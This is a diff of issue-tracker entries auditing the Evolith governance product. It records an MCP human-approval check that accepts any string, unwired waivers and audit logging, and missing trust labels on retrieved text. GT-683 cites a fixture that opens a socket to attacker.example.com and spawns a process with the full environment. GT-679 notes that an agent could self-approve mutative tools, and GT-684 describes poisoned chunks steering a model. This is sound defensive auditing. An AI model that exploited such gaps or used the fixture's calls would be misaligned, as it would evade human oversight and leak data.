+- **Evidence:** `maxSkippedFraction` is implemented and unit-tested, and `grep -rn "maxSkippedFraction"` over the repository (excluding `node_modules`, `dist`, `coverage`) returns hits only under `src/packages/core-domain/src/application/validators/`, two prose comments and the board — **zero** under `src/sdk/cli`, `src/apps/core-api` or `src/packages/mcp-server`. There is no CLI flag, no MCP tool argument, no REST field, no profile key and no environment variable that sets it, so `coverageThresholdIssue` short-circuits to `undefined` on every real run and `GOV-COVERAGE-THRESHOLD` can only ever be emitted from core-domain's own specs. **The seam matters:** `validate-satellite.use-case.ts:76-104` enumerates option fields when it rebuilds the validator, so a new option that is not added there is silently dropped even after a flag exists — the same failure `GT-664` recorded for `processRunner`.
+- **Use cases:**
+  - A tenant wants CI to fail when a quarter of the applicable rules did not execute, and has no way to express it.
+  - A satellite drifts, its skip count climbs, and nothing escalates because `rulesSkipped` is advisory on every surface.
+  - An auditor asks what coverage floor is configured and there is no field to point at.
+  - An MCP or REST caller cannot reproduce a CLI verdict because a threshold that changes the outcome is unrepresentable on their surface.
+- **Impact:** Coverage is the difference between "no blocking findings" and "the blocking rules never ran" — the distinction this corpus keeps discovering it cannot make. Shipping the measurement while leaving it unreachable means the board records a control that no run has ever applied.
+- **Expected outcome:** a `--max-skipped-fraction` flag, an MCP argument and a REST field, all carried across the use-case rebuild seam, producing an identical blocking issue on all three surfaces.
+- **Affected files:** `src/sdk/cli/src/commands/validate/validate.command.ts`, `src/packages/core-domain/src/application/use-cases/validate-satellite.use-case.ts`, `src/packages/mcp-server/src/tools/**`, `src/apps/core-api/src/presentation/controllers/evaluation.controller.ts`
+- **Component:** `Core Domain` · **Criticality:** P1 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. Deliberately NOT merged with [`GT-675`](./gap-reference-catalog.md#gt-675): the coverage floor cannot catch the OPA case, because OPA reports `rulesSkipped: 0` — measured `rulesChecked 354 / rulesSkipped 0` against native's `113 / 241`. They are two independent false-green channels that happen to share a rebuild seam.
+- **Acceptance criteria:**
+  - [ ] `evolith validate --max-skipped-fraction 0.2 --format json` on this repository exits non-zero with a `GOV-COVERAGE-THRESHOLD` issue naming the unevaluated count, the executable denominator and the configured maximum.
+  - [ ] **FALSIFIABILITY:** the same run at `1.0`, and with the flag omitted, exits 0 for this reason and emits no such issue — the gate observed both firing and not firing.
+  - [ ] **SEAM:** deleting `maxSkippedFraction` from the option list at `validate-satellite.use-case.ts:76-104` turns the suite red, proven by a test that constructs the use case and takes the rebuilding branch rather than the instance built in `app.module.ts`.
+  - [ ] MCP parity: the tool accepts the threshold and the cross-surface exploratory tester reports 0 divergences with the new binding.
+  - [ ] REST parity: the field is read inside the per-request construction and a request returns the blocking issue.
+  - [ ] `ruleset-validator.types.ts` stops documenting the denominator as `rulesTotal`; it has been `rulesExecutable` since `GT-595`.
+- **Status:** `PENDING`
+
+#### GT-677
+
+**Title:** An approved waiver suppresses nothing on any shipped path — the gate implements suppression and no production caller passes the store
+
+- **Purpose:** Make the product's highest-consequence human action — accepting a risk — actually change a verdict.
+- **Evidence:** `evaluateDriftGate` implements full waiver suppression behind an optional parameter (`drift-gate.ts:90` `readonly waivers?: IWaiverStore`, `:171-186` `applyWaivers` → `frozen: true`, a `waived[]` entry and `evidence.waiverRef`), and **every production call site omits the argument.** Verified 2026-08-14 by enumerating them: `evaluate.command.ts:174` (`evaluateDriftGate({ result, codeowners })`), `evaluate.command.ts:204` and `mcp-server/src/tools/evaluate.tool.ts:138` (`evaluateDriftGate({ result })`). The only call sites that pass `waivers:` are in `drift-gate.spec.ts:105,117`. Symmetrically, `FileWaiverStore` has exactly **one** non-spec consumer in the repository — `waiver.command.ts:110` — the command that WRITES waivers. **Measured end to end by execution, not by reading:** in a scratch workspace, `evaluate --format drift` → exit 2 with 94 violations, first `{"ruleId":"GOV-000","fingerprint":"a670fcba5dccb53f","frozen":false}`; then `waiver request --ref W-1 --fingerprint a670fcba5dccb53f` + `waiver approve --ref W-1 --by lead` → `"effectiveStatus":"approved"` persisted in `.evolith/waivers.json`; then the identical drift run → **exit 2, `blockingFailures 94 → 94`, `frozen 0 → 0`, `waiverRef undefined`, no "Waived findings" section.** The waived violation is still reported `frozen: false`.
+- **Use cases:**
+  - An owner accepts a documented risk, approves the waiver, and the merge stays blocked with no explanation.
+  - A team concludes the waiver command is broken and disables the gate instead — the worst possible response, and the rational one.
+  - [`GT-670`](./gap-reference-catalog.md#gt-670)'s calibration channel is built on approved waivers meaning something; today they mean nothing.
+  - An auditor asks which evaluation a given waiver applied to, and no such evaluation exists.
+  - `waiver.command.ts:58-60` tells the reader "the drift gate … consumes the SAME store", which is false in the product's own source.
+- **Impact:** `GT-518` reads `DONE` for "durable waiver store + `evolith waiver` CLI + the drift gate", and both halves were built without ever being connected — the exact shape of defect this board keeps finding, on the one action that lets a human overrule the machine. It is also the cheapest fix in this wave: one argument at three call sites.
+- **Expected outcome:** production call sites resolve an `IWaiverStore` and pass it, so an approved, unexpired, fingerprint-matching waiver moves the finding into the "Waived findings" section the gate already renders at `drift-gate.ts:136-139`, and moves the exit code.
+- **Affected files:** `src/sdk/cli/src/commands/evaluate/evaluate.command.ts`, `src/packages/mcp-server/src/tools/evaluate.tool.ts`, `src/sdk/cli/src/commands/waiver/waiver.command.ts`, `src/packages/core-domain/src/evaluation/drift-gate.ts`
+- **Component:** `Evolith CLI` · **Criticality:** P1 · **Complexity:** XS
+- **Principal:** `XS` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave, and re-verified independently before registration: the three call sites and the single non-spec `FileWaiverStore` consumer were enumerated by grep in this working tree. **`GT-518` must be annotated rather than reopened** — its closure record stands as history, and this row carries the measurement that its two halves were never wired to each other. Blocks [`GT-682`](./gap-reference-catalog.md#gt-682) criterion 6 and [`GT-687`](./gap-reference-catalog.md#gt-687) criterion 2, and refutes the premise [`GT-670`](./gap-reference-catalog.md#gt-670) reasons from.
+- **Acceptance criteria:**
+  - [ ] Approving a waiver for one blocking violation's fingerprint and re-running `evaluate --format drift` in the same workspace shows it under "Waived findings" naming `W-<ref>@v<version>` and its expiry, with `frozen: true` in the manifest and `blockingFailures = N-1`.
+  - [ ] A workspace whose only blocking violation is waived exits **0** — the exit code is what CI reads.
+  - [ ] **FALSIFIABILITY (four negatives, each observed failing to suppress):** a `requested`-but-unapproved waiver, a `rejected` one, an approved one past `expiresAt`, and an approved one whose fingerprint does not match. A green-path-only suite is not evidence: `applyWaivers` already passes its green path today while the product suppresses nothing.
+  - [ ] MCP parity: `evaluate.tool.ts` resolves a store, and an oracle asking both surfaces about the same workspace and waiver asserts identical waived sets, shown going red when the store is passed to one surface only.
+  - [ ] Store resolution is an explicit, tested option defaulting to the **workspace**, not `process.cwd()` as `waiver.command.ts:110` does today, with a test proving a waiver approved from a different cwd still applies.
+  - [ ] `waiver.command.ts:58-60` is true or rewritten, with a test that fails if the claim and the wiring diverge again.
+- **Status:** `PENDING`
+
+#### GT-678
+
+**Title:** No per-rule tenant softening: duplicate ids load additively and an authored `enabled: false` is accepted by the schema and dropped by the loader
+
+- **Purpose:** Let a tenant disable, downgrade or de-block ONE rule, and make the loader say so, instead of silently producing two contradictory copies.
+- **Evidence:** Pack-level selection exists and is wired (`--select`, `ProfileConfig.select`, `GT-659`/`GT-660`/`GT-661`), so the gap is granularity and direction, not existence. **Measured against the real `DiskRulesetRepository`** over a corpus where a tenant pack redefines the Core rule `ACL-02` as `severity: warning, blocking: false, enabled: false`: `TOTAL RULES LOADED: 2` — `{"id":"ACL-02","severity":"MUST","blocking":true,"src":"rulesets/core.rules.json"}` **and** `{"id":"ACL-02","severity":"SHOULD","blocking":false,"src":"rulesets/tenants/tenantpack.rules.json"}` — with `enabled` **absent from both**, dropped rather than read as false. The schema permits it: `definitions.rule` carries no `additionalProperties: false`, unlike `definitions.enforce` beside it. **And the tenant-override surface that appears to exist does not:** `src/rulesets/tenants/**` ships a schema, an example and a README with **zero** code consumers (`grep -rnE "overridesRef|tenant-override" --include='*.ts'` → 0), and the README claims `multi-tenancy.rego` enforces it, which is false — `MTN-01..08` read `input.satellite.multiTenancy.*`.
+- **Use cases:**
+  - A tenant accepts one rule's risk permanently and must choose between adopting the whole pack or none of it.
+  - A tenant authors an override and gets a duplicate finding — the rule fires twice, at two severities, from two files.
+  - A tenant writes `"enabled": false`, the run is unchanged, and nothing tells them the key was discarded.
+  - An auditor asks which rules this tenant softened and from what to what; nothing records it.
+- **Impact:** "The Core exposes its catalogue and the client selects its level" stops at pack granularity, and a dead schema ships as if it worked. A silently dropped key is worse than a rejected one: it looks like configuration.
+- **Expected outcome:** a per-rule delta the loader actually reads, every applied override named in the result as a sibling of `GT-661`'s `selection` field, and unknown rule keys rejected rather than discarded.
+- **Affected files:** `src/packages/infra-providers/src/disk-ruleset.repository.ts`, `src/rulesets/schema/**`, `src/rulesets/tenants/**`
+- **Component:** `Core Domain` · **Criticality:** P2 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. Separated from [`GT-669`](./gap-reference-catalog.md#gt-669) deliberately — authoring a new rule and softening an existing one are different mechanisms with different fixes (loader merge and schema strictness here; an authoring surface there) — and from [`GT-673`](./gap-reference-catalog.md#gt-673), which is about the upgrade overwriting whatever the tenant wrote. The candidate's stronger framing, "there is no tenant selection at all", was REFUTED before registration.
+- **Acceptance criteria:**
+  - [ ] **FALSIFIABILITY (observed red first):** a test loading a corpus where a tenant pack redefines a Core rule id asserts the rule appears once at the tenant's severity, and must be observed first reproducing `TOTAL RULES LOADED: 2` with the Core copy still `blocking: true`.
+  - [ ] An unknown key in a rule — today `enabled` — is either rejected with a named error or honoured; never today's silent no-op.
+  - [ ] A per-rule delta is expressible in a document a production code path reads, and the run reports the rule once at the overridden severity.
+  - [ ] Every override that changed a run is named in the result with from→to, approver and expiry, asserted non-empty for an overridden run and **empty rather than absent** for a clean one.
+  - [ ] An override that removes a blocking criterion is rejected with a named issue id, observed failing in a test.
+  - [ ] `src/rulesets/tenants/README.md` is corrected or deleted; a document describing enforcement that does not exist is worse than no document.
+- **Status:** `PENDING`
+
+#### GT-679
+
+**Title:** The MCP human-approval second factor is an unverified string: any non-empty value approves any mutative tool
+
+- **Purpose:** Make the approval gate on the 20 mutative MCP tools mean that a human approved something, which today it does not.
+- **Evidence:** **Read verbatim on 2026-08-14** at `mcp-tool-dispatch.ts:232`: `if (args.apply !== true || !args.approvalToken || typeof args.approvalToken !== 'string' || args.approvalToken.trim() === '')`. That is the entire predicate — no issuer, no store, no signature, no expiry, no single use, no binding to principal, tool or arguments — so the gate adds **zero** authorization beyond the `write` scope the caller already holds and the ABAC decision that already ran. Nothing anywhere issues a token: `grep -rn "issueApproval|redeemApproval|mintApproval|createApprovalToken" src` returns nothing outside doc comments and fixtures. The currently **passing** test `mcp-server.service.spec.ts:125-137` calls `handleCallTool('evolith-write-file', { apply: true, approvalToken: 'test-token-123' })` and asserts success — the defect is pinned green. **A complete approval subsystem exists one package away and is never consulted:** `agent-runtime/src/adapters/approval/` has TTL, `approve(id, approver)` and fail-closed expiry, and `mrtr-request-state.ts` seals state with AES-256-GCM, `expiresAt` and `timingSafeEqual` while explicitly EXCLUDING `approvalToken` from the sealed digest (`:81`).
+- **Use cases:**
+  - An autonomous agent holding a valid `write` key mints its own token and self-approves every irreversible tool it calls.
+  - An auditor asks who approved a `satellite-create`; the record holds a fingerprint of a string nobody issued.
+  - The elicitation round trip is bypassed entirely through the inline shortcut at `stateless-rpc.ts:288-292`, and the server cannot distinguish the two paths.
+  - `McpInteractionAdapter.ts:47-49` maps any caller string to `{granted: true, approver: 'mcp'}` and would pre-satisfy the agent-runtime approval check if it were ever wired.
+- **Impact:** Human-in-the-loop is the control this product sells hardest, and on the agent-facing surface it is a truthiness check. `GT-158` records the opposite as delivered — its criterion "an `approvalToken` **issued out-of-band**" is ticked and nothing issues one.
+- **Expected outcome:** an integrity-protected grant carrying approver, tenant, tool, a digest of the binding arguments and an expiry, verified before `tool.execute`, reusing the HKDF and `timingSafeEqual` machinery already in the repository.
+- **Affected files:** `src/packages/mcp-server/src/mcp/mcp-tool-dispatch.ts`, `src/packages/mcp-server/src/mcp/stateless-rpc.ts`, `src/packages/mcp-server/src/mcp/mrtr-request-state.ts`, `src/packages/agent-runtime/src/adapters/approval/**`
+- **Component:** `MCP Server` · **Criticality:** P1 · **Complexity:** L
+- **Principal:** `L` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave; the predicate was read directly in this working tree before registration. **Two framings were REFUTED and are excluded:** "any authenticated MCP client can execute a mutative tool" is false — a scope gate (`:188-195`) and native+OPA ABAC (`:210-229`) run first, so the token adds nothing *beyond* those rather than being the only control; and "no approval store, TTL, signature or approver identity exists anywhere" is false — all four exist in `agent-runtime` and are simply never consulted. **`GT-158` is annotated by this row rather than reopened:** its closure record stands, and the measurement that nothing issues a token is recorded here.
+- **Acceptance criteria:**
+  - [ ] **FALSIFIABILITY:** a mutative call with `approvalToken: 'x'`, from a caller that holds a valid `write` credential and passes ABAC, is REFUSED with a reason. The commit adding that test without the fix must be observed red — today the equivalent assertion passes green in the opposite direction.
+  - [ ] `grep -n "test-token-123" src/packages/mcp-server/src/mcp/mcp-server.service.spec.ts` returns nothing.
+  - [ ] Issuance exists and is measurable: a grant is issued by a named surface, and redeeming a grant issued for tool A against tool B is refused.
+  - [ ] Expiry and single use are each proven — a clock advanced past `expiresAt`, and a second redemption refused.
+  - [ ] Both protocol paths reach one verifier: a parity test where a token accepted on the dispatch path but refused on the `stateless-rpc.ts` inline shortcut fails the build.
+  - [ ] The audit line answers "who approved" with an approver identity and a redemption record id, with the raw token still redacted so `GT-332`'s assertions pass unchanged.
+  - [ ] `McpInteractionAdapter.ts:47-49` no longer converts a caller-supplied string into `{granted: true, approver: 'mcp'}`.
+- **Status:** `PENDING`
+
+#### GT-680
+
+**Title:** The MCP tool-call audit is an in-memory ring buffer and the durable ledger it was closed against has no production instantiation
+
+- **Purpose:** Make the audit record survive a restart and be readable, which the board already records as delivered.
+- **Evidence:** **Verified first-hand 2026-08-14:** `grep -rn "JsonlAuditRepository" src .harness` returns exactly **two** hits — `jsonl-audit-repository.ts:15`, its own declaration, and `jsonl-transparency-ledger.ts:4`, a prose comment. Zero instantiations, zero imports, zero DI registrations; `new AuditService(...)` appears only in specs. `AuditLogger` keeps 1000 events in process memory and warns about that itself (`audit-logger.ts:37-42`). **Separately, `resources/read` and `prompts/get` are not audited at all:** `logResourceAccess` and `logPromptAccess` are defined at `audit-logger.ts:72,77` and their only callers in the entire tree are `mcp-server.service.spec.ts:709,724` — the tests call the logger directly, which is why `GT-221`'s ticked criterion "emits structured events for every tool/resource/prompt call across both transports" reads as satisfied. `AUDIT_LOG_PATH` appears in no document while `AUDIT_MAX_EVENTS` is documented.
+- **Use cases:**
+  - A restart erases the queryable record of every mutative call made since boot.
+  - An incident reviewer asks which agent read which resource; no event was ever emitted for a resource read.
+  - An operator wants the audit on disk and finds no documented variable to point at a path.
+  - There is no read surface at all — no controller in `mcp-server/src`, no audit or history tool — so the record cannot be consulted even while the process lives.
+- **Impact:** `GT-321` is `DONE` on "audit events persist to an append-only store" and "queryable by tenant/phase/actor/correlationId", closed against a class that no code path can reach. That is a board-integrity cost on top of the defect: the row that would have caught this reads as delivered.
+- **Expected outcome:** MCP tool, resource and prompt calls land in the durable ledger; the ledger is exported, wired and documented; `GT-321` and `GT-221` are annotated with the measurement.
+- **Affected files:** `src/packages/mcp-server/src/mcp/audit-logger.ts`, `src/packages/mcp-server/src/mcp/mcp.module.ts`, `src/packages/core-domain/src/infrastructure/audit/jsonl-audit-repository.ts`, `src/packages/core-domain/src/index.ts`, `reference/**/env-variables-reference.md`
+- **Component:** `MCP Server` · **Criticality:** P1 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave and re-verified independently. **Two sub-claims were REFUTED and are excluded:** "MCP records the call, never the verdict" is false (`mcp-server.service.ts:216-227` resolves `success | error | denied`), and "on restart the entire record is gone" is false — every event also reaches stdout as JSON (`audit-logger.ts:51`), so what dies with the process is the queryable buffer, not the emission. Registered as a NEW row rather than reopening `GT-321`, because `08-validate-tracking` treats a closure record on a non-DONE row as an error and unwinding history would destroy the evidence trail; the correction lives here and is cross-referenced from there.
+- **Acceptance criteria:**
+  - [ ] With a temp `AUDIT_LOG_PATH`, invoking a tool then killing and restarting the process leaves the call readable from the JSONL file.
+  - [ ] A test constructing `ResourcesService`/`PromptsService` — not `AuditLogger` — and calling the real handler observes an audit entry; this is the criterion `GT-221` ticked and cannot pass today.
+  - [ ] `JsonlAuditRepository` is exported and has a non-spec, non-declaration import, and `AUDIT_LOG_PATH` appears in the environment reference in both languages.
+  - [ ] **FALSIFIABILITY:** a test makes the durable append fail (read-only path or throwing adapter) and asserts both that the tool's own verdict is unchanged and that the failure is surfaced, shown going red when the failure branch is removed.
+  - [ ] **FALSIFIABILITY:** a test rewrites an existing ledger line and asserts the read path reports tampering; if key custody is required, that half is deferred to [`GT-588`](./gap-reference-catalog.md#gt-588) in writing rather than ticked.
+  - [ ] `GT-321` and `GT-221` carry an annotation recording that `JsonlAuditRepository` had zero instantiations and the resource/prompt loggers zero production callers when they were closed.
+- **Status:** `PENDING`
+
+#### GT-681
+
+**Title:** Every holder of the shared MCP API key collapses into one principal, the per-client provisioning service has no caller, and neither MCP nor CLI ever stamps the requester
+
+- **Purpose:** Make "who did this" answerable on the agent-facing surface, and make one leaked credential revocable without rotating every agent.
+- **Evidence:** On the API-key path `validateAuth` returns a frozen constant principal — `mcp-server-auth.ts:80` returns `{ ...ADMIN_CONTEXT, environment }` with `mcp-auth-contexts.ts:9` `id: 'admin-api-key'`. **Verified first-hand 2026-08-14:** `grep -rn "ApiKeyProvisioningService" src` returns only the service's own file, its spec, the README prose and `mcp.module.ts:9,14,15` where it is registered as a provider and exported — **zero call sites**, although the service mints `evk_`-prefixed keys with a SHA-256 hash, scopes, `expiresAt`, `revokedAt`, `rotateKey` and `revokeKey`. And `grep -rnE "requester|actorId|actorType" src/packages/mcp-server/src src/sdk/cli/src` returns **0**, so every agent-originated verdict reaches the ledger with `requestedBy` absent even though the REST DTO can carry it.
+- **Use cases:**
+  - One leaked key cannot be revoked without rotating the credential every agent uses.
+  - The audit trail names a constant, so "which agent did this" is unanswerable on the shared-key path.
+  - `evaluation-ingest.ts:159` names the target question — "which agent's verdicts keep failing" — and the wire cannot answer it from MCP or CLI.
+  - An operator looks for the documented key-management surface and finds only `/health*`, `/metrics` and `/.well-known/oauth-protected-resource`.
+- **Impact:** `GT-266` is `DONE` with "a CLI command or HTTP endpoint generates keys on demand", "rotation without restart" and "revocation documented" all ticked, against a service nothing calls and an in-process `Map` that does not survive a restart.
+- **Expected outcome:** the API-key path resolves credentials through the provisioning service; a key-management surface exists and appears in the generated interface catalog; MCP and CLI forward `requester{actorType, actorId, modelRef?, sessionId?}`.
+- **Affected files:** `src/packages/mcp-server/src/mcp/mcp-server-auth.ts`, `src/packages/mcp-server/src/mcp/api-key-provisioning.service.ts`, `src/packages/mcp-server/src/tools/evaluate.tool.ts`, `src/sdk/cli/src/commands/evaluate/evaluate.command.ts`
+- **Component:** `MCP Server` · **Criticality:** P1 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave and re-verified independently. **One framing was REFUTED:** "no per-agent credential, scope or revocation exists" is false — the whole mechanism exists and is unwired, which is a different defect and a cheaper fix. Sequenced AFTER [`GT-680`](./gap-reference-catalog.md#gt-680), whose durable record this row's closing criterion consumes. `GT-266` is annotated by this row, not reopened, for the same reason as `GT-321`.
+- **Acceptance criteria:**
+  - [ ] Two provisioned keys with different client labels presented to the same running server yield two different `userId` values in the audit trail; today both are `admin-api-key`.
+  - [ ] **FALSIFIABILITY:** a key that authenticated successfully is revoked through the exposed surface, the same request is replayed against the **same running process**, and it returns 401 while a second key still succeeds. A unit test asserting `revokeKey()` returns `true` does not satisfy this.
+  - [ ] The provisioning service has a call site outside its own file, its spec and the module registration, and the route or command appears in the generated catalog so the exploratory tester can see it.
+  - [ ] Key metadata survives a restart, or the service carries the same explicit production warning `audit-logger.ts:37-42` already prints, with the restart test recording which outcome occurred.
+  - [ ] `evolith-evaluate` and the CLI accept and forward `requester`, and a deposited payload from that run carries a non-empty `requestedBy` verified against the ingest field provenance.
+  - [ ] **NEGATIVE:** with no caller-supplied requester and no authenticated principal, `requestedBy` is **absent, not a placeholder** — the "absent in, absent out" rule `GT-586` already enforces for `repositoryRevision`.
+- **Status:** `PENDING`
+
+#### GT-682
+
+**Title:** Every governance measurement and appeal command exists only on the CLI: seven commands have no MCP tool and no REST route
+
+- **Purpose:** Let an agent measure and appeal a governance decision through the same surface it triggered it from.
+- **Evidence:** `calibrate`, `audit verify`, `waiver`, `enforce`, `standards`, `history` and `profile` are registered CLI commands, and none has a counterpart among the 52 registered `evolith-*` MCP tools: a loop over those names against `src/packages/mcp-server/src/tools/*.ts` matches **0 files for every one of them**. The only REST `waiver` surface is input-side (`WaiverFactDto`) plus two reference-metadata fields. So an agent can trigger an evaluation and cannot verify the ledger it just wrote to, cannot request a waiver for the verdict it just received, and cannot read a calibration report.
+- **Use cases:**
+  - An agent evaluates, gets blocked, and has no surface on which to request a waiver.
+  - An agent writes to the audit ledger and cannot verify it.
+  - The Tracker cannot render calibration without shelling out to the CLI.
+  - `enforce` — the enforcement command itself — is equally unreachable, so the parity claim in the interfaces README is narrower than it reads.
+- **Impact:** The architecture states CLI is the reference surface and MCP holds full parity. Seven commands, including the entire measurement and appeal axis, are outside that claim.
+- **Expected outcome:** `evolith-calibrate-report`, `evolith-audit-verify` and `evolith-waiver` registered with ADR-0073 envelopes and cross-surface bindings, and the REST half decided in writing against the stateless-Core scoping rather than left silent.
+- **Affected files:** `src/packages/mcp-server/src/tools/**`, `src/tests/exploration/bindings.ts`, `reference/core/interfaces/README.md`
+- **Component:** `Evolith MCP` · **Criticality:** P2 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. **The candidate's framing was REFUTED and widened:** measurement is not "the one place parity was never delivered" — `enforce`, `standards`, `history` and `profile` are equally CLI-only, so this is a general parity deficit of at least seven commands. **Gated by [`GT-677`](./gap-reference-catalog.md#gt-677):** porting `waiver` before waivers take effect would ship a write-only operation to a second surface.
+- **Acceptance criteria:**
+  - [ ] The three tools appear in the registry and the API-catalog parity spec is green after regeneration, with the live tool count observed rising from 52.
+  - [ ] Each new tool asserts a top-level `success` / `data` / `meta.correlationId`, and the waiver tool carries the correlationId of the verdict being waived, as the CLI already does.
+  - [ ] The exploration bindings gain the three operations with CLI and MCP builders, and the cross-surface tester reports them BOUND with 0 divergences.
+  - [ ] **FALSIFIABILITY:** deleting any one MCP registration turns the catalog-parity spec red, demonstrated in the closure record; and ABAC is observed DENYING one of the new tools for a role lacking waiver authority against the **compiled** `policy.wasm` rather than the source `.rego`, with both the deny and the allow shown.
+  - [ ] A written decision records whether waiver persistence belongs on the stateless REST surface; if not, the exclusion is recorded in the interfaces README and enforced by the binding table, never silently.
+  - [ ] The closure record either shows an approved waiver suppressing a finding on both surfaces, or states in writing that this row ports a write-only operation because [`GT-677`](./gap-reference-catalog.md#gt-677) has not landed.
+- **Status:** `PENDING`
+
+#### GT-683
+
+**Title:** The nine blocking agentic-AI rules are decided by reading one self-declared JSON file, so a repository with an unsandboxed socket and an env-leaking spawn passes all of them
+
+- **Purpose:** Make the flagship AI-governance topology observe the repository it grades, or say plainly that it grades a declaration.
+- **Evidence:** All nine `AAI-*` MUST/blocking rules are decided from `agent.config.json`. **Verified first-hand 2026-08-14:** the handler at `src/packages/core-domain/src/application/validators/evaluators/handlers/architecture/agent-rules.ts` reads `readJsonConfig(fs, ctx.satellitePath, 'agent.config.json')` at `:14` and compares declared fields, and `grep -nE "spawn|exec\(|fetch|http|ProcessRunner|net\.|socket"` over that file returns **NO MATCHES** — it has no primitive with which to observe anything. **The OPA path is not a second oracle:** `opa-input-builder.ts:116-144` computes the same booleans from the same file and feeds them to `agentic-ai.rego` as `input.satellite.agenticAi.*`. **Measured end to end:** a satellite containing exactly two files — the shipped `fixtures/valid-agent.config.json` as `agent.config.json`, plus one runbook — returned `AAI-R01 … AAI-R09 passed`, 9 of 9; adding `src/escape.js` containing `net.connect(443, 'attacker.example.com')` and `execSync(…, { env: process.env })` — the literal inverse of AAI-R02 and AAI-R05 — changed **nothing**: still 9 of 9. AAI-R08 demands "a readable runbook document" and an **empty directory** satisfies it. AAI-R03 passes with declared `promptSources` and `implementationRoots` that do not exist; that existence check lives test-only at `agentic-ai-self-conformance.spec.ts:126-141`, whose own comment states the defect.
+- **Use cases:**
+  - A customer passes the agentic-AI topology with zero agent code in the repository.
+  - A repository with an unrestricted outbound socket and an environment-inheriting `child_process` spawn is certified against nine blocking MUSTs.
+  - The verdict cannot tell a buyer which passes were observed: `rule-evaluability.ts` classifies all nine as `native-handler`, a class that does not distinguish reading a self-declaration from inspecting a repository.
+  - Evolith's own `agent.config.json` honestly marks R02, R05 and R08 as `partial` and R09 as `declarative`, and no evaluator reads that block.
+- **Impact:** This is the AI-governance claim itself. A competitor gating on observed execution — sandboxes, metered gateways, receipts — is measuring behaviour where this topology compares strings, and the difference is invisible in the verdict.
+- **Expected outcome:** at least three AAI rules gain an observational evaluator through the existing `enforce` seam (today `grep -c '"enforce"' agentic-ai.rules.json` → 0), and every rule still decided from a declaration is labelled as such in the verdict.
+- **Affected files:** `src/packages/core-domain/src/application/validators/evaluators/handlers/architecture/agent-rules.ts`, `src/rulesets/topologies/agentic-ai/**`, `src/rulesets/opa/agentic-ai.rego`, `src/packages/core-domain/src/evaluation/opa-input-builder.ts`
+- **Component:** `Core Domain` · **Criticality:** P1 · **Complexity:** L
+- **Principal:** `L` · **Interest:** `SEVERE` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave; the handler's lack of any observation primitive was re-verified in this working tree before registration. **Registered P1 and not P0, stated rather than assumed:** nothing runs in production yet (`GT-435`/`GT-448`), so this is a wrong verdict rather than an outage — but it carries `SEVERE` interest because every day it stands, the topology certifies repositories it never inspected. **One sub-claim was REFUTED:** the AAI enforcement statuses are not all `declarative` — R02, R05 and R08 are `partial` and only R09 is `declarative`. **Cheapest slice, ship first:** criterion 3, which moves an existence check that already exists in a spec into the handler.
+- **Acceptance criteria:**
+  - [ ] **FALSIFIABILITY (the criterion that closes it):** the exact fixture measured here — a conformant `agent.config.json` plus an unrestricted outbound socket and an env-inheriting `child_process` spawn — produces at least one FAILED AAI verdict, with the literal before (9 of 9 passed, 2026-08-14) and after recorded.
+  - [ ] AAI-R08 fails on a directory and on a zero-byte file.
+  - [ ] AAI-R03 fails when declared `promptSources` or `implementationRoots` do not exist under the satellite path, moving the check out of `agentic-ai-self-conformance.spec.ts` so those compensating assertions can be deleted without weakening the suite.
+  - [ ] Every rule object carries a truthful `assurance` of `observed` or `declared`, and the four that Evolith's own config marks `partial` or `declarative` may not be labelled `observed` while decided by field comparison; an auditor can partition the nine from the JSON verdict alone.
+  - [ ] The distinction is visible to a buyer in the topology README and in the rule explanation, with a guard that exits 1 when README and ruleset disagree, demonstrated by flipping one value and showing the guard fail.
+  - [ ] Native/OPA parity survives: the strengthened fixture yields a violation on the wasm path too, `agentic-ai.test.rego` covers the new failing case, and `opa test` is green.
+  - [ ] The identical read-the-declaration pattern in the serverless, event-driven and data-mesh topology readers is fixed or explicitly deferred in writing on this row.
+- **Status:** `PENDING`
+
+#### GT-684
+
+**Title:** Content returned to a calling model carries no trust classification, so Evolith fails on its own surface the control it sells as a blocking rule
+
+- **Purpose:** Mark third-party-authored text as data before handing it to a model, which is what `AAI-R06` requires of every satellite.
+- **Evidence:** `evolith-knowledge-search` with `includeText: true` emits raw third-party prose with source attribution and no trust label and no structural fence, and the dispatch layer adds none for any of the 52 tools — `grep -rn "trust|provenance|untrusted"` over `mcp-tool-dispatch.ts` and `tool.interface.ts` returns 0. **The ADR says so about itself:** `0082-agentic-ai-trust-boundary.md:9-15` carries `<!-- implementation-status: none -->` and the text "No trust label on retrieved context exists anywhere in `src/`. … Evolith itself neither labels nor schema-validates tool output before acting on it." Meanwhile `AAI-R06` "Untrusted Context Is Data" is a blocking MUST Evolith enforces on satellites (`agentic-ai.rego:30`, wired at `opa-input-builder.ts:139` and in the native handler). No injection-shaped fixture exists anywhere in the repository, so no negative test asserts that a hostile chunk fails to steer a later call.
+- **Use cases:**
+  - A poisoned corpus chunk reaches a model as undifferentiated context, indistinguishable from Evolith's own instructions.
+  - A buyer asks whether Evolith meets the control it grades them on, and the honest answer is in an Accepted ADR that says no.
+  - The multi-tenant RAG direction turns a tenant's corpus into the same channel with no control in place.
+  - A reviewer looks for the negative test that would catch a regression here and finds no injection-shaped fixture at all.
+- **Impact:** Failing your own blocking rule on your own surface is the most quotable defect a governance product can have, and it is documented in our own ADR rather than hidden.
+- **Expected outcome:** a trust classification in the chunk schema's required set and a non-forgeable fence around emitted text.
+- **Affected files:** `src/packages/mcp-server/src/tools/knowledge*`, `src/packages/mcp-server/src/mcp/mcp-tool-dispatch.ts`, `reference/core/architecture/adrs/core/0082-agentic-ai-trust-boundary.md`
